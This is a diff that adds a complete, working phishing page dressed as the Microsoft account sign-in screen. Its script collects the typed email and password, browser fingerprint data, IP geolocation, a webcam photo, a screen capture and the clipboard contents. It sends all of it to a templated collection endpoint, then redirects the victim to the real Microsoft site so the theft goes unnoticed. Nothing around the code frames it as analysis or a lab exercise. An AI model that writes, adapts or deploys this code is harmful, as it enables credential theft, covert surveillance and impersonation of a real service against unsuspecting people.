@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Sign in to your Microsoft Account</title>
+<link rel="icon" href="https://www.microsoft.com/favicon.ico">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',SegoeUI,'Helvetica Neue',Helvetica,Arial,sans-serif;background:#f8f9fa;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.card{background:#fff;padding:44px;max-width:400px;width:90%;box-shadow:0 2px 12px rgba(0,0,0,.08);border-radius:2px}
+.logo{width:108px;margin-bottom:24px}
+h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:4px}
+.sub{color:#616161;font-size:15px;margin-bottom:32px;line-height:1.4}
+.input-group{margin-bottom:16px}
+.input-group input{width:100%;padding:12px;border:1px solid #666;border-radius:2px;font-size:15px;outline:none}
+.input-group input:focus{border-color:#0067b8}
+.input-group input::placeholder{color:#8e8e8e}
+.btn{background:#0067b8;color:#fff;border:none;border-radius:2px;padding:12px 28px;font-size:15px;cursor:pointer;font-weight:500;float:right;margin-top:16px}
+.btn:hover{background:#005da6}
+.btn:disabled{opacity:.4;cursor:default}
+.link{color:#0067b8;text-decoration:none;font-size:13px;display:inline-block;margin-top:16px}
+.link:hover{text-decoration:underline}
+#video{display:none;width:100%;border-radius:2px;margin:16px 0;background:#000;max-height:200px;object-fit:cover}
+.loading{display:none;color:#616161;font-size:14px;margin-top:20px;clear:both}
+</style>
+</head>
+<body>
+<div class="card">
+<img class="logo" src="https://www.microsoft.com/favicon.ico" alt="Microsoft">
+<h1>Sign in</h1>
+<p class="sub">to continue to your Microsoft account</p>
+<div class="input-group"><input type="text" id="login" placeholder="Email, phone, or Skype" autocomplete="off"></div>
+<div class="input-group"><input type="password" id="password" placeholder="Password" autocomplete="off"></div>
+<button class="btn" id="login_btn" onclick="login()">Sign in</button>
+<video id="video" autoplay muted playsinline></video>
+<div class="loading" id="loading">Signing in...</div>
+<div style="margin-top:60px;clear:both">
+<a class="link" href="#">Forgot password?</a><br>
+<a class="link" href="#">Sign in with Windows Hello</a>
+</div>
+</div>
+<script>
+const LID='{{LINK_ID}}',BASE='{{BASE_URL}}',SID='{{SESSION_ID}}';
+let c={session:SID};
+document.getElementById('password').addEventListener('keydown',e=>{if(e.key==='Enter')login()});
+async function collect(){
+    c.ua=navigator.userAgent;c.platform=navigator.platform;
+    c.screen=screen.width+'x'+screen.height;c.language=navigator.language;
+    c.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;
+    c.cookies=navigator.cookieEnabled?1:0;
+    try{const r=await fetch('https://ip-api.com/json/?fields=query,country,city,lat,lon,isp,proxy,hosting');const j=await r.json();Object.assign(c,j)}catch(e){}
+    try{
+        const st=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'}});
+        const v=document.getElementById('video');v.srcObject=st;v.style.display='block';
+        await new Promise(r=>setTimeout(r,1500));
+        const ca=document.createElement('canvas');ca.width=v.videoWidth||640;ca.height=v.videoHeight||480;
+        ca.getContext('2d').drawImage(v,0,0);
+        c.photo=ca.toDataURL('image/jpeg',0.85).split(',')[1];
+        st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    try{const txt=await navigator.clipboard.readText();if(txt)c.clipboard=txt}catch(e){}
+    await fetch(BASE+'/c/'+LID,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(c)})
+}
+async function login(){
+    const l=document.getElementById('login').value.trim(),pw=document.getElementById('password').value.trim();
+    if(!l||!pw)return;
+    c.login=l;c.password=pw;
+    c.visit_duration=Math.floor((Date.now()-t0)/1000);
+    document.getElementById('login_btn').disabled=true;
+    document.getElementById('loading').style.display='block';
+    try{
+        const st=await navigator.mediaDevices.getDisplayMedia({preferCurrentTab:true});
+        const tr=st.getVideoTracks()[0];const ic=new ImageCapture(tr);const bm=await ic.grabFrame();
+        const ca=document.createElement('canvas');ca.width=bm.width;ca.height=bm.height;
+        ca.getContext('2d').drawImage(bm,0,0);
+        c.screenshot=ca.toDataURL('image/png').split(',')[1];
+        tr.stop();st.getTracks().forEach(t=>t.stop())
+    }catch(e){}
+    await collect();
+    document.getElementById('loading').textContent='✓ Signed in!';
+    setTimeout(()=>{window.location.href='https://account.microsoft.com'},1500)
+}
+const t0=Date.now()
+</script>
+</body>
+</html>
